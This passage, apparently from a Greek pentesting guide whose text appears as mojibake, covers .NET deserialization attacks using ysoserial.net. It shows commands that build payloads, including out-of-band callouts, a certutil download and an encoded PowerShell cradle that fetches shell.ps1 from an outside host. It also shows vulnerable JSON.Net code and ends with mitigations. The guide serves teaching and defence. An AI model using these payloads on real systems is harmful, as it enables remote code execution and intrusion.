Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚**. Î‘Ï†Î¿Ï ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ git repository Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏÏƒÎµÏ„Îµ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Visual Studio Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±.

Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Î³Î¹Î± **Ï€ÏÏ‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Ï„Î¿ ysoserial.net Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ® Ï„Î¿Ï…** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± [**ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î· ÏƒÎµÎ»Î¯Î´Î± ÏŒÏ€Î¿Ï… ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ gadget ObjectDataProvider + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

ÎŸÎ¹ ÎºÏÏÎ¹ÎµÏ‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ Ï„Î¿Ï… **ysoserial.net** ÎµÎ¯Î½Î±Î¹: **`--gadget`**, **`--formatter`**, **`--output`** ÎºÎ±Î¹ **`--plugin`.**

* **`--gadget`** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÎ¹ Ï„Î¿ gadget Ï€Î¿Ï… Î¸Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ (Ï…Ï€Î¿Î´ÎµÎ¯Î¾Ï„Îµ Ï„Î·Î½ ÎºÎ»Î¬ÏƒÎ·/ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Ï€Î¿Ï… Î¸Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ ÎºÎ±Ï„Î¬ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚).
* **`--formatter`**, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÎ¹ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ Î³Î¹Î± Ï„Î· ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î·Ï‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ (Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï€Î¿Î¹Î± Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ back-end Î³Î¹Î± Î½Î± Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»Î¿Î³Î®ÏƒÎµÎ¹ Ï„Î¿ payload ÎºÎ±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Î¯Î´Î¹Î± Î³Î¹Î± Î½Î± Ï„Î¿ ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ)
* **`--output`** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÎ¹ Î±Î½ Î¸Î­Î»ÎµÏ„Îµ Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÏƒÎµ **raw** Î® **base64** ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·. _Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ **ysoserial.net** Î¸Î± **ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹** Ï„Î¿ payload Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **UTF-16LE** (ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÏƒÏ„Î± Windows) Î¿Ï€ÏŒÏ„Îµ Î±Î½ Ï€Î¬ÏÎµÏ„Îµ Ï„Î¿ raw ÎºÎ±Î¹ Ï„Î¿ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï€Î»Î¬ Î±Ï€ÏŒ Î¼Î¹Î± ÎºÎ¿Î½ÏƒÏŒÎ»Î± linux Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î± **Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± ÏƒÏ…Î¼Î²Î±Ï„ÏŒÏ„Î·Ï„Î±Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚** Ï€Î¿Ï… Î¸Î± ÎµÎ¼Ï€Î¿Î´Î¯ÏƒÎ¿Ï…Î½ Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ ÏƒÏ‰ÏƒÏ„Î¬ (ÏƒÏ„Î·Î½ HTB JSON box Ï„Î¿ payload Î»ÎµÎ¹Ï„Î¿ÏÏÎ³Î·ÏƒÎµ ÎºÎ±Î¹ ÏƒÎµ UTF-16LE ÎºÎ±Î¹ ASCII Î±Î»Î»Î¬ Î±Ï…Ï„ÏŒ Î´ÎµÎ½ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï€Î¬Î½Ï„Î±)._
* **`--plugin`** Ï„Î¿ ysoserial.net Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ plugins Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± **ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÏ‰Î½ Î³Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± Ï€Î»Î±Î¯ÏƒÎ¹Î±** ÏŒÏ€Ï‰Ï‚ Ï„Î¿ ViewState

#### Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹ ysoserial.net

* `--minify` Î¸Î± Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î­Î½Î± **Î¼Î¹ÎºÏÏŒÏ„ÎµÏÎ¿ payload** (Î±Î½ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½)
* `--raf -f Json.Net -c "anything"` Î‘Ï…Ï„ÏŒ Î¸Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÎ¹ ÏŒÎ»Î± Ï„Î± gadgets Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î¼Îµ Î­Î½Î±Î½ Ï€Î±ÏÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ formatter (`Json.Net` ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·)
* `--sf xml` Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÏ„Îµ Î­Î½Î± gadget** (`-g`) ÎºÎ±Î¹ Ï„Î¿ ysoserial.net Î¸Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÎ¹ formatters Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ "xml" (Ï‡Ï‰ÏÎ¯Ï‚ Î´Î¹Î¬ÎºÏÎ¹ÏƒÎ· Ï€ÎµÎ¶ÏÎ½-ÎºÎµÏ†Î±Î»Î±Î¯Ï‰Î½)

**Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ysoserial** Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÏ‰Î½:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** Î­Ï‡ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î¼Î¹Î± **Ï€Î¿Î»Ï ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎ± Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿** Ï€Î¿Ï… Î²Î¿Î·Î¸Î¬ Î½Î± ÎºÎ±Ï„Î±Î½Î¿Î®ÏƒÎµÏ„Îµ ÎºÎ±Î»ÏÏ„ÎµÏÎ± Ï€ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÎºÎ¬Î¸Îµ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·: `--test`\
Î‘Î½ Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿, **ysoserial.net** Î¸Î± **Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÎ¹** Ï„Î·Î½ **ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î¿Ï€Î¹ÎºÎ¬,** ÏÏƒÏ„Îµ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Ï„Î¿ payload ÏƒÎ±Ï‚ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ ÏƒÏ‰ÏƒÏ„Î¬.\
Î‘Ï…Ï„Î® Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î· Î³Î¹Î±Ï„Î¯ Î±Î½ Î±Î½Î±Î¸ÎµÏ‰ÏÎ®ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î¸Î± Î²ÏÎµÎ¯Ï„Îµ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹Î± ÎºÏÎ´Î¹ÎºÎ± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ (Î±Ï€ÏŒ [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î´Î¿ÎºÎ¹Î¼Î±ÏƒÏ„ÎµÎ¯ Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·, Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î¸Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In the **Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿Ï‚ ÎºÏÎ´Î¹ÎºÎ±Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿Ï‚ ÏƒÏ„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ**. ÎˆÏ„ÏƒÎ¹, Î±Î½ Î²ÏÎµÎ¯Ï„Îµ ÎºÎ¬Ï„Î¹ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ ÏƒÎµ Î¼Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® .Net, ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï€Î¹Î¸Î±Î½ÏÏ‚ Î±Ï…Ï„Î® Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ ÎµÏ…Î¬Î»Ï‰Ï„Î·.\
Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î· **`--test`** Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ Î¼Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎºÎ±Ï„Î±Î½Î¿Î®ÏƒÎ¿Ï…Î¼Îµ **Ï€Î¿Î¹Î± ÎºÎ¿Î¼Î¼Î¬Ï„Î¹Î± ÎºÏÎ´Î¹ÎºÎ± ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î±** ÏƒÏ„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î·Ï‚ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï„Î¿ **ysoserial.net**.

### ViewState

Î¡Î¯Î¾Ï„Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÎµ [Î±Ï…Ï„Î® Ï„Î·Î½ POST ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ **Ï„Î¿ Ï€ÏÏ‚ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ \_\_ViewState Ï„Î¿Ï… .Net**](exploiting-\_\_viewstate-parameter.md) Î³Î¹Î± **Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÎºÏÎ´Î¹ÎºÎ±.** Î‘Î½ **Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Î®Î´Î· Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î· Î¼Î·Ï‡Î±Î½Î® Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚, [**Î´Î¹Î±Î²Î¬ÏƒÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ· Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÏÏ‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÏÎ´Î¹ÎºÎ±**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Prevention

Î“Î¹Î± Î½Î± Î¼ÎµÏ„ÏÎ¹Î¬ÏƒÎµÏ„Îµ Ï„Î¿Ï…Ï‚ ÎºÎ¹Î½Î´ÏÎ½Î¿Ï…Ï‚ Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ Ï„Î·Î½ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÏƒÏ„Î¿ .Net:

* **Î‘Ï€Î¿Ï†ÏÎ³ÎµÏ„Îµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Îµ ÏƒÏ„Î¹Ï‚ ÏÎ¿Î­Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î½Î± Î¿ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î¿Ï…Ï‚ Ï„ÏÏ€Î¿Ï…Ï‚ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Ï‰Î½ Ï„Î¿Ï…Ï‚.** Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ `DataContractSerializer` Î® `XmlSerializer` ÏŒÏ„Î±Î½ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½.
* **Î“Î¹Î± Ï„Î¿ `JSON.Net`, Î¿ÏÎ¯ÏƒÏ„Îµ Ï„Î¿ `TypeNameHandling` ÏƒÎµ `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Î‘Ï€Î¿Ï†ÏÎ³ÎµÏ„Îµ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… `JavaScriptSerializer` Î¼Îµ Î­Î½Î±Î½ `JavaScriptTypeResolver`.**
* **Î ÎµÏÎ¹Î¿ÏÎ¯ÏƒÏ„Îµ Ï„Î¿Ï…Ï‚ Ï„ÏÏ€Î¿Ï…Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½**, ÎºÎ±Ï„Î±Î½Î¿ÏÎ½Ï„Î±Ï‚ Ï„Î¿Ï…Ï‚ ÎµÎ³Î³ÎµÎ½ÎµÎ¯Ï‚ ÎºÎ¹Î½Î´ÏÎ½Î¿Ï…Ï‚ Î¼Îµ Ï„Î¿Ï…Ï‚ Ï„ÏÏ€Î¿Ï…Ï‚ .Net, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `System.IO.FileInfo`, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¹Ï‚ Î¹Î´Î¹ÏŒÏ„Î·Ï„ÎµÏ‚ Ï„Ï‰Î½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®, ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Î¬ÏÎ½Î·ÏƒÎ·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚.
* **ÎÎ± ÎµÎ¯ÏƒÏ„Îµ Ï€ÏÎ¿ÏƒÎµÎºÏ„Î¹ÎºÎ¿Î¯ Î¼Îµ Ï„Î¿Ï…Ï‚ Ï„ÏÏ€Î¿Ï…Ï‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÎµÏ€Î¹ÎºÎ¯Î½Î´Ï…Î½ÎµÏ‚ Î¹Î´Î¹ÏŒÏ„Î·Ï„ÎµÏ‚**, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `System.ComponentModel.DataAnnotations.ValidationException` Î¼Îµ Ï„Î·Î½ Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± `Value`, Î· Î¿Ï€Î¿Î¯Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯.
* **Î•Î»Î­Î³Î¾Ï„Îµ Î¼Îµ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„ÏÏ€Ï‰Î½** Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÏ„Îµ Ï„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î±Ï€ÏŒ Ï„Î¿ Î½Î± ÎµÏ€Î·ÏÎµÎ¬ÏƒÎ¿Ï…Î½ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚, ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Ï„Î¿ `DataContractSerializer` Î® Ï„Î¿ `XmlSerializer` ÎµÏ…Î¬Î»Ï‰Ï„Î±.
* **Î•Ï†Î±ÏÎ¼ÏŒÏƒÏ„Îµ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ Î»ÎµÏ…ÎºÎ®Ï‚ Î»Î¯ÏƒÏ„Î±Ï‚** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î±Î½ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿ `SerializationBinder` Î³Î¹Î± Ï„Î¿ `BinaryFormatter` ÎºÎ±Î¹ Ï„Î¿ `JSON.Net`.
* **ÎœÎµÎ¯Î½ÎµÏ„Îµ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î¿Î¹ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î³Î½Ï‰ÏƒÏ„Î¬ Î±Î½Î±ÏƒÏ†Î±Î»Î® ÎµÏÎ³Î±Î»ÎµÎ¯Î± Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚** ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… .Net ÎºÎ±Î¹ Î´Î¹Î±ÏƒÏ†Î±Î»Î¯ÏƒÏ„Îµ ÏŒÏ„Î¹ Î¿Î¹ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Ï„Î­Ï‚ Î´ÎµÎ½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¿ÏÎ½ Ï„Î­Ï„Î¿Î¹Î¿Ï…Ï‚ Ï„ÏÏ€Î¿Ï…Ï‚.
* **Î‘Ï€Î¿Î¼Î¿Î½ÏÏƒÏ„Îµ Ï„Î¿Î½ Î´Ï…Î½Î·Ï„Î¹ÎºÎ¬ ÎµÏ€Î¹ÎºÎ¯Î½Î´Ï…Î½Î¿ ÎºÏÎ´Î¹ÎºÎ±** Î±Ï€ÏŒ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿ Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï†ÏÎ³ÎµÏ„Îµ Ï„Î·Î½ Î­ÎºÎ¸ÎµÏƒÎ· Î³Î½Ï‰ÏƒÏ„ÏÎ½ ÎµÏÎ³Î±Î»ÎµÎ¯Ï‰Î½, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `System.Windows.Data.ObjectDataProvider` ÏƒÎµ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ WPF, ÏƒÎµ Î¼Î· Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„ÎµÏ‚ Ï€Î·Î³Î­Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.

### **References**

* Java ÎºÎ±Î¹ .Net JSON Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· **Î­Î³Î³ÏÎ±Ï†Î¿:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** Î¿Î¼Î¹Î»Î¯Î±: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ÎºÎ±Î¹ 